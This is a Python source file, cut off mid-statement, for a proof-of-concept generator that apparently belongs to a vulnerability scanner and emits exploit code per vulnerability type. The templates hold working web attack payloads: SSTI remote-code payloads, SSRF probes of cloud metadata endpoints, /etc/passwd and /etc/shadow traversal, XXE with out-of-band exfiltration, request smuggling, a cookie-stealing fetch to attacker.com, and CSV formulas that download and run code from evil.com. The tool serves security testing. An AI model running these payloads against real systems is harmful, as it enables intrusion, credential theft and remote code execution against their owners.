"""
PoC Code Generator - Generates proof-of-concept code for confirmed vulnerabilities.

Produces executable PoC code per vulnerability type:
- HTML files for client-side vulns (clickjacking, CSRF, XSS, CORS, open redirect)
- Python scripts for injection vulns (SQLi, command injection, SSRF, SSTI)
- curl commands for header-based vulns (CRLF, host header, XXE)
"""

from urllib.parse import urlparse, urlencode, quote


class PoCGenerator:
    """Generate proof-of-concept exploitation code for confirmed vulnerabilities."""

    def generate(self, vuln_type: str, url: str, param: str,
                 payload: str, evidence: str, method: str = "GET") -> str:
        """Generate PoC code based on vulnerability type.

        Returns a string containing executable PoC code (HTML, Python, curl, etc.)
        """
        # Normalize vuln_type to method name
        safe_type = vuln_type.lower().replace("-", "_").replace(" ", "_")
        generator = getattr(self, f'_poc_{safe_type}', None)
        if generator:
            return generator(url, param, payload, evidence, method)
        # Try prefix matching for sqli variants, xss variants, etc.
        for prefix in ("sqli", "xss", "nosql"):
            if safe_type.startswith(prefix):
                fallback = getattr(self, f'_poc_{prefix}', None)
                if fallback:
                    return fallback(url, param, payload, evidence, method)
        return self._poc_generic(url, param, payload, evidence, method)

    # ─── Client-side PoCs (HTML) ────────────────────────────────────────

    def _poc_clickjacking(self, url: str, param: str, payload: str,
                          evidence: str, method: str) -> str:
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        body {{ margin: 0; font-family: Arial, sans-serif; background: #1a1a2e; color: #eee; }}
        .info {{ padding: 20px; background: #16213e; border-bottom: 2px solid #e94560; }}
        h1 {{ color: #e94560; margin: 0 0 10px 0; }}
        .container {{ position: relative; width: 100%; height: 600px; margin-top: 20px; }}
        iframe {{
            position: absolute; top: 0; left: 0;
            width: 100%; height: 100%;
            opacity: 0.3;  /* Set to 0 for real attack */
            z-index: 2;
            border: none;
        }}
        .overlay {{
            position: absolute; top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 1;
            display: flex; align-items: center; justify-content: center;
        }}
        .bait-button {{
            padding: 20px 40px; font-size: 24px;
            background: #e94560; color: white; border: none;
            border-radius: 8px; cursor: pointer;
        }}
    </style>
</head>
<body>
    <div class="info">
        <h1>Clickjacking Proof of Concept</h1>
        <p><strong>Target:</strong> {self._escape_html(url)}</p>
        <p><strong>Evidence:</strong> {self._escape_html(evidence[:200])}</p>
        <p>The target page is loaded in a transparent iframe. A victim would see only the bait button below,
        but clicking it would interact with the framed page underneath.</p>
    </div>
    <div class="container">
        <div class="overlay">
            <button class="bait-button">Click here to claim your prize!</button>
        </div>
        <iframe src="{self._escape_html(url)}"></iframe>
    </div>
</body>
</html>"""

    def _poc_csrf(self, url: str, param: str, payload: str,
                  evidence: str, method: str) -> str:
        parsed = urlparse(url)
        action_url = url
        # Build form fields from evidence/param
        fields_html = ""
        if param:
            for p in param.split(","):
                p = p.strip()
                if p:
                    fields_html += f'    <input type="hidden" name="{self._escape_html(p)}" value="pwned" />\n'
        if not fields_html:
            fields_html = '    <input type="hidden" name="action" value="update" />\n'

        return f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF Proof of Concept</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #1a1a2e; color: #eee; padding: 20px; }}
        .info {{ background: #16213e; padding: 20px; border-left: 4px solid #e94560; margin-bottom: 20px; }}
        h1 {{ color: #e94560; }}
        pre {{ background: #0f3460; padding: 15px; border-radius: 4px; overflow-x: auto; }}
        .manual {{ margin-top: 20px; }}
    </style>
</head>
<body>
    <div class="info">
        <h1>CSRF Proof of Concept</h1>
        <p><strong>Target:</strong> {self._escape_html(action_url)}</p>
        <p><strong>Method:</strong> POST</p>
        <p><strong>Evidence:</strong> {self._escape_html(evidence[:200])}</p>
        <p>This form will auto-submit on page load, performing an unauthorized action on behalf of the victim.</p>
    </div>

    <!-- Auto-submitting CSRF form -->
    <form id="csrf-form" action="{self._escape_html(action_url)}" method="POST">
{fields_html}        <input type="submit" value="Submit" />
    </form>

    <script>
        // Auto-submit after 1 second (remove delay for real PoC)
        setTimeout(function() {{
            // document.getElementById('csrf-form').submit();
            console.log('CSRF form ready - uncomment submit() to auto-fire');
        }}, 1000);
    </script>

    <div class="manual">
        <h3>Manual Verification:</h3>
        <pre>
curl -X POST '{self._escape_curl(action_url)}' \\
  -H 'Content-Type: application/x-www-form-urlencoded' \\
  -H 'Cookie: session=VICTIM_SESSION_COOKIE' \\
  -d '{self._escape_curl(param + "=pwned") if param else "action=update"}'
        </pre>
    </div>
</body>
</html>"""

    def _poc_xss_reflected(self, url: str, param: str, payload: str,
                           evidence: str, method: str) -> str:
        parsed = urlparse(url)
        if param and payload:
            exploit_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{quote(param)}={quote(payload)}"
        else:
            exploit_url = url

        return f"""<!DOCTYPE html>
<html>
<head>
    <title>Reflected XSS Proof of Concept</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #1a1a2e; color: #eee; padding: 20px; }}
        .info {{ background: #16213e; padding: 20px; border-left: 4px solid #e94560; margin-bottom: 20px; }}
        h1 {{ color: #e94560; }}
        pre {{ background: #0f3460; padding: 15px; border-radius: 4px; overflow-x: auto; white-space: pre-wrap; }}
        a {{ color: #0fbcf9; }}
        .payload {{ background: #e94560; color: white; padding: 2px 6px; border-radius: 3px; font-family: monospace; }}
    </style>
</head>
<body>
    <div class="info">
        <h1>Reflected XSS Proof of Concept</h1>
        <p><strong>Target:</strong> {self._escape_html(url)}</p>
        <p><strong>Parameter:</strong> <span class="payload">{self._escape_html(param)}</span></p>
        <p><strong>Payload:</strong> <span class="payload">{self._escape_html(payload)}</span></p>
        <p><strong>Evidence:</strong> {self._escape_html(evidence[:300])}</p>
    </div>

    <h3>Exploit URL:</h3>
    <pre><a href="{self._escape_html(exploit_url)}" target="_blank">{self._escape_html(exploit_url)}</a></pre>

    <h3>curl Verification:</h3>
    <pre>curl -s '{self._escape_curl(exploit_url)}' | grep -i 'script\\|alert\\|onerror\\|onload'</pre>

    <h3>Python Verification:</h3>
    <pre>
import requests

url = "{self._escape_py(url)}"
params = {{"{self._escape_py(param)}": "{self._escape_py(payload)}"}}

resp = requests.get(url, params=params, verify=False)
payload_str = "{self._escape_py(payload)}"

if payload_str in resp.text:
    print(f"[VULNERABLE] Payload reflected in response")
    print(f"Status: {{resp.status_code}}")
else:
    print("[NOT REFLECTED] Payload not found in response")
    </pre>
</body>
</html>"""

    def _poc_xss_stored(self, url: str, param: str, payload: str,
                        evidence: str, method: str) -> str:
        return f"""<!-- Stored XSS Proof of Concept -->
<!--
  Target: {self._escape_html(url)}
  Parameter: {self._escape_html(param)}
  Payload: {self._escape_html(payload)}
  Evidence: {self._escape_html(evidence[:200])}
-->

<!-- Step 1: Submit the payload via form/request -->
<h3>Step 1 - Inject Payload:</h3>
<pre>
curl -X POST '{self._escape_curl(url)}' \\
  -H 'Content-Type: application/x-www-form-urlencoded' \\
  -d '{self._escape_curl(param)}={self._escape_curl(payload)}'
</pre>

<!-- Step 2: Python verification script -->
<h3>Step 2 - Verify Storage:</h3>
<pre>
import requests

# Step 1: Submit stored payload
session = requests.Session()
data = {{"{self._escape_py(param)}": "{self._escape_py(payload)}"}}
resp = session.post("{self._escape_py(url)}", data=data, verify=False)
print(f"Injection response: {{resp.status_code}}")

# Step 2: Visit page to check if payload persists
resp2 = session.get("{self._escape_py(url)}", verify=False)
if "{self._escape_py(payload)}" in resp2.text:
    print("[VULNERABLE] Stored XSS - payload persists in page!")
else:
    print("[CHECK MANUALLY] Payload may render on a different page")
</pre>

<!-- Step 3: Cookie stealer example (for authorized testing only) -->
<h3>Step 3 - Impact Demonstration (cookie exfiltration):</h3>
<pre>
Payload: &lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;
</pre>"""

    def _poc_xss(self, url: str, param: str, payload: str,
                 evidence: str, method: str) -> str:
        """Generic XSS PoC fallback (xss_dom, blind_xss, mutation_xss)"""
        return self._poc_xss_reflected(url, param, payload, evidence, method)

    def _poc_open_redirect(self, url: str, param: str, payload: str,
                           evidence: str, method: str) -> str:
        parsed = urlparse(url)
        exploit_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{quote(param)}={quote(payload)}"

        return f"""<!DOCTYPE html>
<html>
<head><title>Open Redirect PoC</title>
<style>body{{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px}}
.info{{background:#16213e;padding:20px;border-left:4px solid #e94560;margin-bottom:20px}}
h1{{color:#e94560}}pre{{background:#0f3460;padding:15px;border-radius:4px;overflow-x:auto}}
a{{color:#0fbcf9}}</style></head>
<body>
<div class="info">
<h1>Open Redirect PoC</h1>
<p><strong>Target:</strong> {self._escape_html(url)}</p>
<p><strong>Parameter:</strong> {self._escape_html(param)}</p>
<p><strong>Redirect to:</strong> {self._escape_html(payload)}</p>
</div>
<h3>Exploit URL:</h3>
<pre><a href="{self._escape_html(exploit_url)}">{self._escape_html(exploit_url)}</a></pre>
<h3>Verification:</h3>
<pre>curl -v '{self._escape_curl(exploit_url)}' 2>&1 | grep -i 'location:'</pre>
</body></html>"""

    def _poc_cors_misconfig(self, url: str, param: str, payload: str,
                            evidence: str, method: str) -> str:
        return f"""<!DOCTYPE html>
<html>
<head><title>CORS Misconfiguration PoC</title>
<style>body{{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px}}
.info{{background:#16213e;padding:20px;border-left:4px solid #e94560;margin-bottom:20px}}
h1{{color:#e94560}}pre{{background:#0f3460;padding:15px;border-radius:4px}}
#result{{margin-top:20px;padding:15px;background:#0f3460;border-radius:4px;min-height:100px}}</style></head>
<body>
<div class="info">
<h1>CORS Misconfiguration PoC</h1>
<p><strong>Target:</strong> {self._escape_html(url)}</p>
<p><strong>Evidence:</strong> {self._escape_html(evidence[:200])}</p>
<p>This page demonstrates cross-origin data theft via misconfigured CORS headers.</p>
</div>

<h3>JavaScript Exploit:</h3>
<pre>
// Host this on attacker-controlled domain
fetch('{self._escape_html(url)}', {{
    method: 'GET',
    credentials: 'include'  // Send victim's cookies
}})
.then(response => response.text())
.then(data => {{
    console.log('Stolen data:', data);
    // Exfiltrate: fetch('https://attacker.com/log?data=' + encodeURIComponent(data));
}})
.catch(err => console.error('CORS blocked:', err));
</pre>

<h3>curl Verification:</h3>
<pre>
curl -H "Origin: https://evil.com" \\
  -H "Cookie: session=VICTIM_COOKIE" \\
  -v '{self._escape_curl(url)}' 2>&1 | grep -i 'access-control'
</pre>

<button onclick="testCORS()" style="padding:10px 20px;background:#e94560;color:white;border:none;border-radius:4px;cursor:pointer;margin-top:10px">Test CORS</button>
<div id="result">Click button to test...</div>

<script>
function testCORS() {{
    var result = document.getElementById('result');
    result.textContent = 'Testing...';
    fetch('{self._escape_html(url)}', {{ credentials: 'include' }})
        .then(r => r.text())
        .then(d => {{ result.textContent = 'Data received (' + d.length + ' bytes):\\n' + d.substring(0, 500); }})
        .catch(e => {{ result.textContent = 'Blocked: ' + e.message; }});
}}
</script>
</body></html>"""

    # ─── Injection PoCs (Python + curl) ─────────────────────────────────

    def _poc_sqli(self, url: str, param: str, payload: str,
                  evidence: str, method: str) -> str:
        """SQL Injection PoC (covers sqli_error, sqli_union, sqli_blind, sqli_time)"""
        return f"""#!/usr/bin/env python3
\"\"\"SQL Injection Proof of Concept
Target: {url}
Parameter: {param}
Payload: {payload}
Evidence: {evidence[:200]}
\"\"\"
import requests
import urllib3
urllib3.disable_warnings()

TARGET = "{self._escape_py(url)}"
PARAM = "{self._escape_py(param)}"
PAYLOAD = "{self._escape_py(payload)}"

def test_sqli():
    print(f"[*] Testing SQL Injection on {{TARGET}}")
    print(f"[*] Parameter: {{PARAM}}")
    print(f"[*] Payload: {{PAYLOAD}}")
    print()

    # Test 1: Original payload
    params = {{PARAM: PAYLOAD}}
    resp = requests.{method.lower()}(TARGET, {'params=params' if method.upper() == 'GET' else 'data=params'}, verify=False, timeout=15)
    print(f"[*] Response status: {{resp.status_code}}")
    print(f"[*] Response length: {{len(resp.text)}}")

    # Check for SQL error indicators
    sql_errors = [
        "SQL syntax", "mysql_", "ORA-", "PostgreSQL", "sqlite3",
        "ODBC", "syntax error", "unclosed quotation", "unterminated",
        "Microsoft SQL", "Warning: mysql", "SQLSTATE"
    ]
    for error in sql_errors:
        if error.lower() in resp.text.lower():
            print(f"[!] SQL Error detected: {{error}}")

    # Test 2: Boolean-based detection
    print("\\n[*] Boolean-based test:")
    true_payload = PAYLOAD.replace("'", "' OR '1'='1")
    false_payload = PAYLOAD.replace("'", "' OR '1'='2")
    r_true = requests.{method.lower()}(TARGET, {'params' if method.upper() == 'GET' else 'data'}={{PARAM: true_payload}}, verify=False, timeout=15)
    r_false = requests.{method.lower()}(TARGET, {'params' if method.upper() == 'GET' else 'data'}={{PARAM: false_payload}}, verify=False, timeout=15)
    if len(r_true.text) != len(r_false.text):
        print(f"[!] Boolean difference detected: true={{len(r_true.text)}} vs false={{len(r_false.text)}}")
    else:
        print(f"[*] No boolean difference (both {{len(r_true.text)}} bytes)")

    # Test 3: Time-based detection
    import time
    print("\\n[*] Time-based test:")
    time_payload = f"{{PARAM}}' OR SLEEP(3)-- -"
    start = time.time()
    try:
        requests.{method.lower()}(TARGET, {'params' if method.upper() == 'GET' else 'data'}={{PARAM: time_payload}}, verify=False, timeout=15)
    except requests.Timeout:
        pass
    elapsed = time.time() - start
    if elapsed >= 2.5:
        print(f"[!] Time delay detected: {{elapsed:.1f}}s (possible blind SQLi)")
    else:
        print(f"[*] No significant delay: {{elapsed:.1f}}s")

if __name__ == "__main__":
    test_sqli()

# curl equivalent:
# curl -v '{self._escape_curl(url)}?{self._escape_curl(param)}={self._escape_curl(payload)}'
"""

    def _poc_command_injection(self, url: str, param: str, payload: str,
                               evidence: str, method: str) -> str:
        return f"""#!/usr/bin/env python3
\"\"\"Command Injection Proof of Concept
Target: {url}
Parameter: {param}
Payload: {payload}
\"\"\"
import requests
import urllib3
urllib3.disable_warnings()

TARGET = "{self._escape_py(url)}"
PARAM = "{self._escape_py(param)}"

# Test payloads - from benign detection to impact demonstration
PAYLOADS = [
    "{self._escape_py(payload)}",        # Original finding payload
    "; id",                               # Unix identity
    "| whoami",                           # Current user
    "; cat /etc/hostname",                # Hostname
    "$(sleep 3)",                         # Time-based blind
    "`sleep 3`",                          # Backtick time-based
]

def test_rce():
    import time
    print(f"[*] Testing Command Injection on {{TARGET}}")
    for p in PAYLOADS:
        start = time.time()
        params = {{PARAM: p}}
        try:
            resp = requests.{method.lower()}(TARGET, {'params=params' if method.upper() == 'GET' else 'data=params'}, verify=False, timeout=15)
            elapsed = time.time() - start
            print(f"\\n[*] Payload: {{p}}")
            print(f"    Status: {{resp.status_code}} | Length: {{len(resp.text)}} | Time: {{elapsed:.1f}}s")
            # Check for command output indicators
            if any(x in resp.text for x in ["uid=", "root:", "www-data", "/bin/"]):
                print(f"    [!] Command output detected in response!")
            if elapsed >= 2.5:
                print(f"    [!] Time delay detected - possible blind RCE")
        except Exception as e:
            print(f"    Error: {{e}}")

if __name__ == "__main__":
    test_rce()

# curl:
# curl '{self._escape_curl(url)}?{self._escape_curl(param)}={self._escape_curl(payload)}'
"""

    def _poc_ssti(self, url: str, param: str, payload: str,
                  evidence: str, method: str) -> str:
        return f"""#!/usr/bin/env python3
\"\"\"Server-Side Template Injection (SSTI) Proof of Concept
Target: {url}
Parameter: {param}
Payload: {payload}
\"\"\"
import requests
import urllib3
urllib3.disable_warnings()

TARGET = "{self._escape_py(url)}"
PARAM = "{self._escape_py(param)}"

# Detection payloads for various template engines
PAYLOADS = {{
    "Jinja2/Twig": "{{{{7*7}}}}",
    "Jinja2 RCE": "{{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}",
    "Twig": "{{{{_self.env.registerUndefinedFilterCallback('system')}}}}{{{{_self.env.getFilter('id')}}}}",
    "Freemarker": "${{{{7*7}}}}",
    "Velocity": "#set($x=7*7)$x",
    "Smarty": "{{{{php}}}}echo `id`;{{{{/php}}}}",
    "Original": "{self._escape_py(payload)}",
}}

def test_ssti():
    print(f"[*] Testing SSTI on {{TARGET}}")
    for engine, p in PAYLOADS.items():
        params = {{PARAM: p}}
        try:
            resp = requests.{method.lower()}(TARGET, {'params=params' if method.upper() == 'GET' else 'data=params'}, verify=False, timeout=15)
            print(f"\\n[*] {{engine}}: {{p[:60]}}")
            # Check if math was evaluated
            if "49" in resp.text and "7*7" not in resp.text:
                print(f"    [!] Template evaluated! '49' found in response ({{engine}})")
            elif "uid=" in resp.text:
                print(f"    [!] RCE achieved! Command output in response")
            else:
                print(f"    [-] No evaluation detected ({{resp.status_code}})")
        except Exception as e:
            print(f"    Error: {{e}}")

if __name__ == "__main__":
    test_ssti()

# curl:
# curl '{self._escape_curl(url)}?{self._escape_curl(param)}={self._escape_curl(payload)}'
"""

    def _poc_ssrf(self, url: str, param: str, payload: str,
                  evidence: str, method: str) -> str:
        return f"""#!/usr/bin/env python3
\"\"\"Server-Side Request Forgery (SSRF) Proof of Concept
Target: {url}
Parameter: {param}
Payload: {payload}
\"\"\"
import requests
import urllib3
urllib3.disable_warnings()

TARGET = "{self._escape_py(url)}"
PARAM = "{self._escape_py(param)}"

# SSRF test payloads
PAYLOADS = [
    "{self._escape_py(payload)}",                # Original payload
    "http://169.254.169.254/latest/meta-data/",   # AWS metadata
    "http://metadata.google.internal/",            # GCP metadata
    "http://127.0.0.1:80",                         # Localhost
    "http://127.0.0.1:8080",                       # Internal services
    "http://localhost:6379",                        # Redis
    "file:///etc/passwd",                          # File read via SSRF
]

def test_ssrf():
    print(f"[*] Testing SSRF on {{TARGET}}")
    for p in PAYLOADS:
        params = {{PARAM: p}}
        try:
            resp = requests.{method.lower()}(TARGET, {'params=params' if method.upper() == 'GET' else 'data=params'}, verify=False, timeout=10)
            print(f"\\n[*] Payload: {{p[:60]}}")
            print(f"    Status: {{resp.status_code}} | Length: {{len(resp.text)}}")
            # Check for internal data indicators
            if any(x in resp.text for x in ["ami-id", "instance-id", "root:", "169.254"]):
                print(f"    [!] Internal data leaked!")
        except Exception as e:
            print(f"    Timeout/Error: {{e}}")

if __name__ == "__main__":
    test_ssrf()

# curl:
# curl '{self._escape_curl(url)}?{self._escape_curl(param)}={self._escape_curl(payload)}'
"""

    def _poc_ssrf_cloud(self, url: str, param: str, payload: str,
                        evidence: str, method: str) -> str:
        return self._poc_ssrf(url, param, payload, evidence, method)

    def _poc_lfi(self, url: str, param: str, payload: str,
                 evidence: str, method: str) -> str:
        return self._poc_path_traversal(url, param, payload, evidence, method)

    def _poc_rfi(self, url: str, param: str, payload: str,
                 evidence: str, method: str) -> str:
        return f"""#!/usr/bin/env python3
\"\"\"Remote File Inclusion (RFI) Proof of Concept
Target: {url}
Parameter: {param}
\"\"\"
import requests
import urllib3
urllib3.disable_warnings()

TARGET = "{self._escape_py(url)}"
PARAM = "{self._escape_py(param)}"

PAYLOADS = [
    "{self._escape_py(payload)}",
    "https://evil.com/shell.txt",
    "http://attacker.com/phpinfo.php",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
]

def test_rfi():
    print(f"[*] Testing Remote File Inclusion on {{TARGET}}")
    for p in PAYLOADS:
        resp = requests.{method.lower()}(TARGET, {'params' if method.upper() == 'GET' else 'data'}={{PARAM: p}}, verify=False, timeout=10)
        print(f"[*] Payload: {{p[:60]}} -> Status: {{resp.status_code}}, Length: {{len(resp.text)}}")

if __name__ == "__main__":
    test_rfi()

# curl:
# curl '{self._escape_curl(url)}?{self._escape_curl(param)}={self._escape_curl(payload)}'
"""

    def _poc_path_traversal(self, url: str, param: str, payload: str,
                            evidence: str, method: str) -> str:
        return f"""#!/usr/bin/env python3
\"\"\"Path Traversal / Local File Inclusion Proof of Concept
Target: {url}
Parameter: {param}
Payload: {payload}
\"\"\"
import requests
import urllib3
urllib3.disable_warnings()

TARGET = "{self._escape_py(url)}"
PARAM = "{self._escape_py(param)}"

PAYLOADS = [
    "{self._escape_py(payload)}",
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
    "/etc/passwd",
    "....//....//....//etc/shadow",
]

def test_lfi():
    print(f"[*] Testing Path Traversal on {{TARGET}}")
    for p in PAYLOADS:
        resp = requests.{method.lower()}(TARGET, {'params' if method.upper() == 'GET' else 'data'}={{PARAM: p}}, verify=False, timeout=10)
        print(f"\\n[*] Payload: {{p}}")
        print(f"    Status: {{resp.status_code}} | Length: {{len(resp.text)}}")
        if "root:" in resp.text or "daemon:" in resp.text:
            print(f"    [!] /etc/passwd content detected!")
            print(f"    First 200 chars: {{resp.text[:200]}}")
            break

if __name__ == "__main__":
    test_lfi()

# curl:
# curl '{self._escape_curl(url)}?{self._escape_curl(param)}={self._escape_curl(payload)}'
"""

    def _poc_arbitrary_file_read(self, url: str, param: str, payload: str,
                                  evidence: str, method: str) -> str:
        return self._poc_path_traversal(url, param, payload, evidence, method)

    def _poc_nosql(self, url: str, param: str, payload: str,
                   evidence: str, method: str) -> str:
        return f"""#!/usr/bin/env python3
\"\"\"NoSQL Injection Proof of Concept
Target: {url}
Parameter: {param}
\"\"\"
import requests
import json
import urllib3
urllib3.disable_warnings()

TARGET = "{self._escape_py(url)}"

# NoSQL injection payloads
PAYLOADS = [
    # MongoDB operator injection
    {{"{self._escape_py(param)}[$ne]": ""}},
    {{"{self._escape_py(param)}[$gt]": ""}},
    {{"{self._escape_py(param)}[$regex]": ".*"}},
    # JSON body injection
    {{"$where": "1==1"}},
]

def test_nosql():
    print(f"[*] Testing NoSQL Injection on {{TARGET}}")
    # Test with query params
    for p in PAYLOADS[:3]:
        resp = requests.get(TARGET, params=p, verify=False, timeout=10)
        print(f"[*] Payload: {{p}} -> Status: {{resp.status_code}}, Length: {{len(resp.text)}}")

    # Test with JSON body
    for p in PAYLOADS[3:]:
        resp = requests.post(TARGET, json=p, verify=False, timeout=10)
        print(f"[*] JSON Payload: {{p}} -> Status: {{resp.status_code}}, Length: {{len(resp.text)}}")

if __name__ == "__main__":
    test_nosql()
"""

    # ─── Header-based PoCs (curl + Python) ──────────────────────────────

    def _poc_crlf_injection(self, url: str, param: str, payload: str,
                            evidence: str, method: str) -> str:
        return f"""# CRLF Injection Proof of Concept
# Target: {url}
# Injection Point: HTTP Header ({param or 'X-Forwarded-For'})
# Payload: {payload}

# Method 1: curl with header injection
curl -v -H "{self._escape_curl(param or 'X-Forwarded-For')}: {self._escape_curl(payload)}" \\
  '{self._escape_curl(url)}'

# Method 2: curl with URL-based CRLF
curl -v '{self._escape_curl(url)}%0d%0aInjected-Header:%20true'

# Method 3: Python verification
python3 -c "
import requests
import urllib3
urllib3.disable_warnings()

url = '{self._escape_py(url)}'
# Test CRLF in header
headers = {{'{self._escape_py(param or "X-Forwarded-For")}': '{self._escape_py(payload)}'}}
resp = requests.get(url, headers=headers, verify=False, allow_redirects=False)
print(f'Status: {{resp.status_code}}')
print('Response Headers:')
for k, v in resp.headers.items():
    print(f'  {{k}}: {{v}}')
    if 'injected' in v.lower() or 'set-cookie' in k.lower():
        print(f'  [!] CRLF injection confirmed: {{k}}: {{v}}')
"

# What to look for:
# - Injected headers in response (e.g., Set-Cookie, X-Injected)
# - Response splitting (HTTP/1.1 200 appearing in body)
# - Header value reflection with CRLF characters preserved
"""

    def _poc_header_injection(self, url: str, param: str, payload: str,
                              evidence: str, method: str) -> str:
        return self._poc_crlf_injection(url, param, payload, evidence, method)

    def _poc_host_header_injection(self, url: str, param: str, payload: str,
                                    evidence: str, method: str) -> str:
        return f"""# Host Header Injection Proof of Concept
# Target: {url}
# Evidence: {evidence[:200]}

# Test 1: Override Host header
curl -v -H "Host: evil.com" '{self._escape_curl(url)}'

# Test 2: X-Forwarded-Host
curl -v -H "X-Forwarded-Host: evil.com" '{self._escape_curl(url)}'

# Test 3: Absolute URL with different Host
curl -v -H "Host: evil.com" \\
  --resolve "evil.com:443:{urlparse(url).netloc.split(':')[0]}" \\
  '{self._escape_curl(url)}'

# Python verification:
python3 -c "
import requests
import urllib3
urllib3.disable_warnings()

url = '{self._escape_py(url)}'
tests = [
    {{'Host': 'evil.com'}},
    {{'X-Forwarded-Host': 'evil.com'}},
    {{'X-Host': 'evil.com'}},
]
for headers in tests:
    resp = requests.get(url, headers=headers, verify=False, allow_redirects=False)
    print(f'Headers: {{headers}}')
    print(f'  Status: {{resp.status_code}}')
    if 'evil.com' in resp.text or 'evil.com' in str(resp.headers):
        print('  [!] Host header reflected in response!')
    print()
"

# Impact: Password reset poisoning, cache poisoning, redirect to attacker domain
"""

    def _poc_http_smuggling(self, url: str, param: str, payload: str,
                            evidence: str, method: str) -> str:
        return f"""# HTTP Request Smuggling Proof of Concept
# Target: {url}
# WARNING: This can cause unintended side effects on shared infrastructure

# CL.TE detection (Content-Length vs Transfer-Encoding)
printf 'POST / HTTP/1.1\\r\\nHost: {urlparse(url).netloc}\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nG' | \\
  ncat --ssl {urlparse(url).netloc} 443

# Python detection:
python3 -c "
import socket, ssl

host = '{urlparse(url).netloc}'
smuggle = (
    'POST / HTTP/1.1\\r\\n'
    'Host: ' + host + '\\r\\n'
    'Content-Length: 6\\r\\n'
    'Transfer-Encoding: chunked\\r\\n'
    '\\r\\n'
    '0\\r\\n'
    '\\r\\n'
    'G'
)
context = ssl.create_default_context()
with socket.create_connection((host, 443)) as sock:
    with context.wrap_socket(sock, server_hostname=host) as ssock:
        ssock.sendall(smuggle.encode())
        response = ssock.recv(4096).decode('utf-8', errors='replace')
        print(response[:500])
"
"""

    def _poc_xxe(self, url: str, param: str, payload: str,
                 evidence: str, method: str) -> str:
        return f"""# XML External Entity (XXE) Injection Proof of Concept
# Target: {url}

# Method 1: curl with XXE payload
curl -X POST '{self._escape_curl(url)}' \\
  -H 'Content-Type: application/xml' \\
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>'

# Method 2: Python verification
python3 -c "
import requests
import urllib3
urllib3.disable_warnings()

url = '{self._escape_py(url)}'
# Basic XXE - read /etc/passwd
xml_payload = '''<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">
]>
<root><data>&xxe;</data></root>'''

resp = requests.post(url, data=xml_payload,
    headers={{'Content-Type': 'application/xml'}}, verify=False, timeout=10)
print(f'Status: {{resp.status_code}}')
if 'root:' in resp.text:
    print('[!] XXE confirmed - /etc/passwd content:')
    print(resp.text[:500])
else:
    print('Response:', resp.text[:300])
"

# Blind XXE (out-of-band):
# Host a DTD file on attacker server with:
# <!ENTITY % file SYSTEM "file:///etc/passwd">
# <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
# %eval; %exfil;
"""

    # ─── Other injection PoCs ───────────────────────────────────────────

    def _poc_ldap_injection(self, url: str, param: str, payload: str,
                            evidence: str, method: str) -> str:
        return self._poc_generic(url, param, payload, evidence, method)

    def _poc_xpath_injection(self, url: str, param: str, payload: str,
                             evidence: str, method: str) -> str:
        return self._poc_generic(url, param, payload, evidence, method)

    def _poc_expression_language_injection(self, url: str, param: str, payload: str,
                                           evidence: str, method: str) -> str:
        return self._poc_ssti(url, param, payload, evidence, method)

    def _poc_log_injection(self, url: str, param: str, payload: str,
                           evidence: str, method: str) -> str:
        return self._poc_generic(url, param, payload, evidence, method)

    def _poc_html_injection(self, url: str, param: str, payload: str,
                            evidence: str, method: str) -> str:
        return self._poc_xss_reflected(url, param, payload, evidence, method)

    def _poc_csv_injection(self, url: str, param: str, payload: str,
                           evidence: str, method: str) -> str:
        return f"""# CSV Injection Proof of Concept
# Target: {url}
# Parameter: {param}
# Payload: {payload}

# CSV injection payloads that execute when opened in Excel/Sheets:
# =cmd|'/C calc.exe'!A0
# =HYPERLINK("http://evil.com/steal?cookie="&A1)
# +cmd|'/C powershell IEX(curl evil.com/shell)'!A0

curl -X POST '{self._escape_curl(url)}' \\
  -d '{self._escape_curl(param)}={self._escape_curl(payload)}'

# Then export/download the CSV and open in Excel to trigger execution
"""

    def _poc_email_injection(self, url: str, param: str, payload: str,
                             evidence: str, method: str) -> str:
        return self._poc_generic(url, param, payload, evidence, method)

    def _poc_prototype_pollution(self, url: str, param: str, payload: str,
                                  evidence: str, method: str) -> str:
        return f"""#!/usr/bin/env python3
\"\"\"Prototype Pollution Proof of Concept
Target: {url}
\"\"\"
import requests
import urllib3
urllib3.disable_warnings()

url = "{self._escape_py(url)}"

# Prototype pollution payloads
payloads = [
    {{"__proto__": {{"isAdmin": True}}}},
    {{"constructor": {{"prototype": {{"isAdmin": True}}}}}},
    {{"__proto__": {{"status": 200, "role": "admin"}}}},
]

for p in payloads:
    resp = requests.post(url, json=p, verify=False, timeout=10)
    print(f"Payload: {{p}}")
    print(f"  Status: {{resp.status_code}}, Length: {{len(resp.text)}}")
"""

    def _poc_parameter_pollution(self, url: str, param: str, payload: str,
                                  evidence: str, method: str) -> str:
        return f"""# HTTP Parameter Pollution Proof of Concept
# Target: {url}

# Supply same parameter multiple times
curl -v '{self._escape_curl(url)}?{self._escape_curl(param)}=legit&{self._escape_curl(param)}=injected'

# POST body pollution
curl -X POST '{self._escape_curl(url)}' \\
  -d '{self._escape_curl(param)}=legit&{self._escape_curl(param)}=injected'

# Mixed GET+POST
curl -X POST '{self._escape_curl(url)}?{self._escape_curl(param)}=legit' \\
